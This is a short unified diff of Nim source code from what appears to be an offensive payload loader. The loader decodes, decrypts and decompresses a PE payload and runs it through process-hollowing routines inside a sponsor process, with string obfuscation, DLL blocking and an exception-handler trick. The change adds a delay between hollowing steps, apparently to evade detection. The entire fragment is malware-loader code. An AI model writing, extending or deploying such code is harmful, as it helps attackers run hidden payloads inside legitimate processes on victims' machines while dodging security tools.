@@ -30,7 +30,14 @@ void raiseVEH() {
 proc raiseVEH(): void {.importc: protectString("raiseVEH"), nodecl.}
 
 
-proc execute(payload: string, sponsorCmd: string = getAppFilename(), isBlockDlls: bool, sleepSeconds: int = 0, isEncrypted: bool): bool =
+proc execute(
+    payload: string, 
+    sponsorCmd: string = getAppFilename(), 
+    isBlockDlls: bool, 
+    sleepSeconds: int = 0, 
+    sleepBetweenSteps: int = 0,
+    isEncrypted: bool
+    ): bool =
       
     # Decode, (Decrypt) and decompress PE
     let commandLineParams = commandLineParams()
@@ -74,9 +81,9 @@ proc execute(payload: string, sponsorCmd: string = getAppFilename(), isBlockDlls
 
     # Execute module
     when defined(hollow1) or defined(hollow2) or defined(hollow3):
-        return hollow123(peStr, ppi)
+        return hollow123(peStr, ppi, sleepBetweenSteps)
     when defined(hollow4) or defined(hollow5) or defined(hollow6):
-        return hollow456Manager(peStr, ppi)
+        return hollow456Manager(peStr, ppi, sleepBetweenSteps)
 
 
 proc wrapExecute() =
@@ -85,6 +92,7 @@ proc wrapExecute() =
         sponsorCmd = sponsorPath & sponsorParams,
         isBlockDlls = isBlockDlls,
         sleepSeconds = sleepSeconds,
+        sleepBetweenSteps = sleepBetweenSteps,
         isEncrypted = isEncrypted
     )
     quit(0)
